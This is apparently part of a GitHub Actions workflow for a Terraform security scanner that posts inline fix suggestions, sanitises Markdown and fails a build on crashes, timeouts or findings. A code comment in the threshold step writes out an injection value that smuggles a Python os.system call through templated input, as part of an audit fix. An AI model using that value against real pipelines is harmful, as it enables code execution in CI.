          const URGENCY_EMOJI = { CRITICAL:'🚨', HIGH:'⚠️', MEDIUM:'💡', LOW:'ℹ️' };
          // A custom rule's title and fix_hcl come from the scanned repo, and
          // this comment is posted as the bot. Same rules as the engine's
          // _md_text / _md_fence: outside code spans escape \ [ ] < >, break
          // @mentions and autolinks, escape a leading #; fence code with a
          // run longer than any backtick run inside it.
          const mdText = (s) => {
            const t = String(s ?? '').replace(/[\r\n]+/g, ' ');
            const esc = (x) => x.replace(/[\\\[\]<>&]/g, '\\$&').replace(/@/g, '@\u200b')
              .replace(/(https?):(?=\/\/)/gi, '$1:\u200b').replace(/\bwww\./gi, (m) => m.slice(0, 3) + '\u200b.');
            let out = '', last = 0;
            for (const m of t.matchAll(/(?<!`)(`+)(?!`)[\s\S]+?(?<!`)\1(?!`)/g)) {
              out += esc(t.slice(last, m.index)) + m[0];
              last = m.index + m[0].length;
            }
            return (out + esc(t.slice(last))).replace(/^(\s*)#/, '$1\\#');
          };
          const fence = (body) => '`'.repeat(Math.max(3, ...[...String(body).matchAll(/`+/g)].map((m) => m[0].length + 1)));

          // Dedup by (file, line, rule_id) so multiple rules on the same line each
          // post a suggestion, but identical rule re-fires (e.g. from -recursive scans)
          // collapse. Higher-urgency wins ties.
          //
          // Debug counters — `core.info()` emits these to the workflow log
          // at the end of this step. When a future regression like #19
          // surfaces (inline-suggestion count silently drops to 0), the
          // counter line tells the operator exactly which gate ate the
          // findings: catalogue-side (no fix_hcl), shape-side (no line),
          // not-in-PR-files, not-in-diff-hunk, or post-failure. Without
          // these lines, the only signal is the summary footer's
          // "_No inline suggestions available_" — which is too coarse to
          // localise the bug.
          const skipReasons = { no_fix_hcl: 0, no_line: 0, not_in_pr_files: 0, not_in_diff_hunk: 0, post_failed: 0 };

          const byLoc = new Map();
          for (const f of findings) {
            if (!f.fix_hcl) { skipReasons.no_fix_hcl++; continue; }
            if (f.line == null) { skipReasons.no_line++; continue; }
            const key = `${f.file}:${f.line}:${f.id}`;
            const existing = byLoc.get(key);
            if (!existing || rank(f.urgency) > rank(existing.urgency)) byLoc.set(key, f);
          }

          // Build a per-file set of line numbers that appear on the RIGHT side
          // of this PR's diff. createReviewComment 422s if `line` isn't in a
          // diff hunk, so pre-filtering avoids ~75% of the noise warnings on
          // a typical PR (rules fire all over the file; only a few lines change).
          const rightSideLines = new Map();
          for (const file of changed.data) {
            if (!file.patch) continue;
            const lines = new Set();
            let cur = 0;
            for (const ln of file.patch.split('\n')) {
              const hdr = ln.match(/^@@ -\d+(?:,\d+)? \+(\d+)(?:,\d+)? @@/);
              if (hdr) { cur = parseInt(hdr[1], 10); continue; }
              if (ln.startsWith('+') && !ln.startsWith('+++')) { lines.add(cur); cur++; }
              else if (ln.startsWith(' ')) { lines.add(cur); cur++; }
              // '-' lines don't advance the new-side counter.
            }
            rightSideLines.set(file.filename, lines);
          }

          const headSha = context.payload.pull_request.head.sha;
          let posted = 0;
          for (const [, f] of byLoc) {
            // Strip the in-container mount prefix; the runner-side GITHUB_WORKSPACE
            // is a different path entirely, so don't use it here.
            const rel = f.file.replace(/^\/workspace\//, '');
            if (!changedPaths.has(rel)) { skipReasons.not_in_pr_files++; continue; }
            const inDiff = rightSideLines.get(rel);
            if (!inDiff || !inDiff.has(f.line)) { skipReasons.not_in_diff_hunk++; continue; }
            const emoji = URGENCY_EMOJI[f.urgency] ?? '•';
            const body = [
              `${emoji} **[${f.id}]** — ${mdText(f.title)}`,
              '',
              `> Urgency: \`${f.urgency}\`` + (f.fix_disruption ? ` · Disruption: \`${f.fix_disruption}\`` : ''),
              f.narrative ? `\n> *Adversarial scenario:* ${mdText(f.narrative)}\n` : '',
              `${fence(f.fix_hcl)}suggestion`,
              f.fix_hcl.trimEnd(),
              fence(f.fix_hcl),
            ].join('\n');
            try {
              await github.rest.pulls.createReviewComment({
                owner: context.repo.owner, repo: context.repo.repo,
                pull_number: context.payload.pull_request.number,
                commit_id: headSha,
                body, path: rel, line: f.line, side: 'RIGHT',
              });
              posted++;
            } catch (e) {
              skipReasons.post_failed++;
              core.warning(`Could not post suggestion for ${f.id} at ${rel}:${f.line}: ${e.message}`);
            }
          }

          // R31.9 — emit a single-line diagnostic so the log carries enough
          // detail to diagnose a "0 inline comments posted on a PR with
          // findings" regression without rerunning. Cheap (one log line),
          // off-the-hot-path, and the format is grep-friendly. Issue #19
          // documents the regression that motivated this hardening.
          core.info(
            `[tf-analyze inline-suggestion summary] ` +
            `findings=${findings.length} ` +
            `with_fix_hcl_and_line=${byLoc.size} ` +
            `posted=${posted} ` +
            `skipped[no_fix_hcl=${skipReasons.no_fix_hcl},` +
            `no_line=${skipReasons.no_line},` +
            `not_in_pr_files=${skipReasons.not_in_pr_files},` +
            `not_in_diff_hunk=${skipReasons.not_in_diff_hunk},` +
            `post_failed=${skipReasons.post_failed}] ` +
            `changed_paths=${changedPaths.size} ` +
            `right_side_lines_files=${rightSideLines.size}`
          );

          // Summary comment, upserted.
          //
          // The engine has already rendered a PR-shaped Markdown block
          // via `--format pr-summary` (score banner + top-3 findings +
          // top fix + collapsed Mermaid attack graph). We use that as
          // the spine and append action-specific lines (count of inline
          // suggestions posted) so the comment surfaces both:
          //   1. What the scan found  (engine's pr-summary)
          //   2. What this action just did  (inline-suggestion count)
          let prSummaryRendered = '';
          try {
            prSummaryRendered = require('fs').readFileSync(
              process.env.TFA_PR_SUMMARY,
              'utf-8'
            ).trim();
          } catch (e) {
            core.warning(`Could not read pr-summary.md: ${e.message}`);
          }

          const actionFooter = posted > 0
            ? `\n\n${posted} fix suggestion(s) posted inline — click **Apply suggestion** to fix in one click.`
            : (findings.length > 0
                ? '\n\n_No inline suggestions available for changed files._'
                : '');

          const summaryBody = prSummaryRendered
            ? prSummaryRendered + actionFooter
            : (findings.length === 0
                ? `✅ **tf-analyze**: ${summary.score ?? 100} (${grade}) — no findings above threshold`
                : [
                    `## tf-analyze: ${summary.score} (${grade})`,
                    '',
                    '| Urgency | Count |',
                    '|---------|------:|',
                    `| 🚨 CRITICAL | ${counts.CRITICAL ?? 0} |`,
                    `| ⚠️ HIGH | ${counts.HIGH ?? 0} |`,
                    `| 💡 MEDIUM | ${counts.MEDIUM ?? 0} |`,
                    `| ℹ️ LOW | ${counts.LOW ?? 0} |`,
                    actionFooter,
                    '',
                    `<sub>scoring_version ${summary.scoring_version ?? 1} · ${summary.formula ?? ''}</sub>`,
                  ].join('\n'));

          // Match on author as well as prefix: anyone can post a comment
          // that starts with `## tf-analyze:`, and updating theirs would put
          // the real summary in a comment they can rewrite. Paginate so a
          // PR with more than 30 comments still finds the prior summary.
          const comments = await github.paginate(github.rest.issues.listComments, {
            owner: context.repo.owner, repo: context.repo.repo,
            issue_number: context.payload.pull_request.number, per_page: 100,
          });
          const prior = comments.find(c =>
            c.user && c.user.type === 'Bot' && c.user.login === 'github-actions[bot]' &&
            (c.body.startsWith('## tf-analyze:') || c.body.startsWith('✅ **tf-analyze**'))
          );
          if (prior) {
            await github.rest.issues.updateComment({
              owner: context.repo.owner, repo: context.repo.repo,
              comment_id: prior.id, body: summaryBody,
            });
          } else {
            await github.rest.issues.createComment({
              owner: context.repo.owner, repo: context.repo.repo,
              issue_number: context.payload.pull_request.number, body: summaryBody,
            });
          }

    - name: Apply fail-on threshold
      if: always()
      shell: bash
      # Round-5 audit fix #1 — `${{ inputs.fail-on }}` is interpolated
      # by GitHub Actions templating BEFORE the shell sees the heredoc,
      # so a malicious caller could inject arbitrary Python by passing
      # `fail-on: '"); import os; os.system("…"); _ = ("'`. The
      # `<<'PY'` quoted heredoc prevents shell expansion but not
      # Actions templating. Moving the input through `env:` makes the
      # value reachable only via `os.environ`, which is a runtime
      # variable read (no parser code-path) so injection is impossible.
      env:
        TFA_FAIL_ON: ${{ inputs.fail-on }}
        TFA_JSON_REPORT: ${{ steps.scan.outputs.json-report-path }}
        TFA_JSON_RC: ${{ steps.scan.outputs.json-rc }}
      run: |
        python3 - <<'PY'
        import json, sys, os
        # The JSON scan's exit code. 2+ is a crash: whatever report exists
        # is not a result. 1 is the engine's own gate tripping, which only
        # happens for a gate flag passed in extra-args (the action itself
        # passes none); rebuilding the verdict from the JSON would drop
        # that stricter gate. Empty = the scan step never ran.
        rc = os.environ.get("TFA_JSON_RC", "")
        if not rc.isdigit():
            print("::error::tf-analyze: the scan did not run (no exit code recorded); nothing was checked.", file=sys.stderr)
            sys.exit(1)
        if int(rc) >= 2:
            print(f"::error::tf-analyze: the JSON scan crashed (exit {rc}); see tf-analyze-json-stderr.txt in the scan step's log.", file=sys.stderr)
            sys.exit(1)
        if int(rc) == 1:
            print("::error::tf-analyze: the engine's own gate failed the scan (exit 1) — a gate flag in `extra-args` (e.g. --fail-on, --fail-on-parse-error) tripped; see the scan step's log.", file=sys.stderr)
            sys.exit(1)
        # A missing or malformed report (the scan never ran or crashed)
        # raises here and fails the step: no report is not a pass.
        with open(os.environ["TFA_JSON_REPORT"]) as f:
            d = json.load(f)
        # Fail closed on anything that isn't a findings report (a trend
        # table, an error object, a truncated write): it has nothing to pass.
        if not isinstance(d, dict) or not (
            isinstance(d.get("findings"), list) or isinstance(d.get("by_target"), dict)
        ):
            print("::error::tf-analyze: the JSON report is not a findings report; nothing to gate.", file=sys.stderr)
            sys.exit(1)
        rank = {"CRITICAL":4,"HIGH":3,"MEDIUM":2,"LOW":1,"INFO":0}
        fail_on = os.environ.get("TFA_FAIL_ON", "HIGH")
        if "by_target" in d:
            # --mode fleet: findings per target, and the diagnostics at the
            # top level (its `summary` maps each target to a count).
            findings = [f for fs in d["by_target"].values() for f in fs]
            summary = d
        else:
            findings = d.get("findings", [])
            summary = d.get("summary", {})
        # No .tf files under the target (wrong `target`, or ignore_paths
        # excluding everything): a clean result would be a false pass.
        if summary.get("nothing_scanned"):
            # In a fleet, `empty_targets` lists each target that had none.
            where = ", ".join(summary.get("empty_targets") or []) or "the target"
            print(f"::error::tf-analyze: no .tf / .tf.json files found under {where}; nothing was checked there. Check the `target` input, extra-args targets and ignore_paths.", file=sys.stderr)
            sys.exit(1)
        # A rule check that ran out of time, or a file that couldn't be
        # read, was not checked: `--fail-on` fails on both, so this gate
        # must too, or a slow-to-match input turns a red PR green.
        if summary.get("rule_timeouts") or summary.get("unreadable_files"):
            print(f"::error::tf-analyze: {len(summary.get('rule_timeouts') or [])} rule check(s) ran out of time and {len(summary.get('unreadable_files') or [])} file(s) could not be read; those were not checked.", file=sys.stderr)
            sys.exit(1)
        threshold = rank.get(fail_on, 3)
        breach = [f for f in findings if rank.get(f.get("urgency",""), 0) >= threshold]
        if breach:
            print(f"::error::tf-analyze: {len(breach)} finding(s) at or above {fail_on} — failing the workflow", file=sys.stderr)
            sys.exit(1)
        PY
